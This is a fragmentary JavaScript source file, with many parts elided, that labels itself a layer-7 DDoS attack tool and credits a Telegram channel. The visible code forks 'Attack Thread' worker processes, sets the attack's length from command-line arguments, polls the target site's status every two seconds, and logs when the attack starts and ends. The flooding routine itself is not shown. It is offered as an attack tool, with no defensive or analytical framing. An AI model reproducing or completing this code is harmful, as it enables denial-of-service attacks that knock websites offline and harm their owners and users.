 //ORIGINAL MADE DDOS LAYER 7 METHOD BY t.me/browserv2
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [browserv2]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [browserv2]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [browserv2]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [browserv2]  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [browserv2]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [browserv2]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [browserv2]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
